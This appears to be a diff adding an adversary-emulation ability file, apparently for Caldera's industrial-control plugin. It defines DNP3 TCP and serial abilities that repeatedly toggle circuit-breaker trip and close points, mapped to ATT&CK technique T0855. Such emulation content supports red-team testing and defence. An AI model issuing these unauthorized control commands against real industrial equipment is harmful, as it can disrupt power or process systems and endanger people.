@@ -1,0 +1,99 @@
+- id: cae4851f-9ff5-4a43-a517-49ffc2546c7f
+  name: DNP3 (TCP) - Toggle (Activation Model)
+  description: |
+    Toggle breaker(s) using activation model (uses separate trip and close
+    indices).
+  tactic: impair-process-control
+  technique_id: T0855
+  technique_name: Unauthorized Command Message
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      ./dnp3-actions tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link}
+      toggle-activation #{dnp3.operate.mode} --trip-indices #{dnp3.toggle.trip_indices}
+      --close-indices #{dnp3.toggle.close_indices} --iterations #{dnp3.toggle.iterations}
+      --delay #{dnp3.toggle.delay_ms}
+    payloads:
+    - dnp3-actions
+    timeout: 60
+  - platform: windows
+    name: psh
+    command: >
+      .\dnp3-actions.exe tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link}
+      toggle-activation #{dnp3.operate.mode} --trip-indices #{dnp3.toggle.trip_indices}
+      --close-indices #{dnp3.toggle.close_indices} --iterations #{dnp3.toggle.iterations}
+      --delay #{dnp3.toggle.delay_ms}
+    payloads:
+    - dnp3-actions.exe
+  - platform: windows
+    name: cmd
+    command: >
+      .\dnp3-actions.exe tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link}
+      toggle-activation #{dnp3.operate.mode} --trip-indices #{dnp3.toggle.trip_indices}
+      --close-indices #{dnp3.toggle.close_indices} --iterations #{dnp3.toggle.iterations}
+      --delay #{dnp3.toggle.delay_ms}
+    payloads:
+    - dnp3-actions.exe
+    timeout: 60
+  - platform: darwin
+    name: sh
+    command: >
+      ./dnp3-actions_darwin tcp #{dnp3.server.ip} #{dnp3.local.link} #{dnp3.remote.link}
+      toggle-activation #{dnp3.operate.mode} --trip-indices #{dnp3.toggle.trip_indices}
+      --close-indices #{dnp3.toggle.close_indices} --iterations #{dnp3.toggle.iterations}
+      --delay #{dnp3.toggle.delay_ms}
+    payloads:
+    - dnp3-actions_darwin
+    timeout: 60
+  repeatable: false
+
+- id: 31f02d27-d8f6-4e03-9572-bf2ce7d4a341
+  name: DNP3 (Serial) - Toggle (Activation Model)
+  description: |
+    Toggle breaker(s) using activation model (uses separate trip and close
+    indices).
+  tactic: impair-process-control
+  technique_id: T0855
+  technique_name: Unauthorized Command Message
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      ./dnp3-actions serial #{dnp3.server.serial_device} #{dnp3.local.link} #{dnp3.remote.link}
+      toggle-activation #{dnp3.operate.mode} --trip-indices #{dnp3.toggle.trip_indices}
+      --close-indices #{dnp3.toggle.close_indices} --iterations #{dnp3.toggle.iterations}
+      --delay #{dnp3.toggle.delay_ms}
+    payloads:
+    - dnp3-actions
+    timeout: 60
+  - platform: windows
+    name: psh
+    command: >
+      .\dnp3-actions.exe serial #{dnp3.server.serial_device} #{dnp3.local.link} #{dnp3.remote.link}
+      toggle-activation #{dnp3.operate.mode} --trip-indices #{dnp3.toggle.trip_indices}
+      --close-indices #{dnp3.toggle.close_indices} --iterations #{dnp3.toggle.iterations}
+      --delay #{dnp3.toggle.delay_ms}
+    payloads:
+    - dnp3-actions.exe
+  - platform: windows
+    name: cmd
+    command: >
+      .\dnp3-actions.exe serial #{dnp3.server.serial_device} #{dnp3.local.link} #{dnp3.remote.link}
+      toggle-activation #{dnp3.operate.mode} --trip-indices #{dnp3.toggle.trip_indices}
+      --close-indices #{dnp3.toggle.close_indices} --iterations #{dnp3.toggle.iterations}
+      --delay #{dnp3.toggle.delay_ms}
+    payloads:
+    - dnp3-actions.exe
+    timeout: 60
+  - platform: darwin
+    name: sh
+    command: >
+      ./dnp3-actions_darwin serial #{dnp3.server.serial_device} #{dnp3.local.link} #{dnp3.remote.link}
+      toggle-activation #{dnp3.operate.mode} --trip-indices #{dnp3.toggle.trip_indices}
+      --close-indices #{dnp3.toggle.close_indices} --iterations #{dnp3.toggle.iterations}
+      --delay #{dnp3.toggle.delay_ms}
+    payloads:
+    - dnp3-actions_darwin
+    timeout: 60
+  repeatable: false
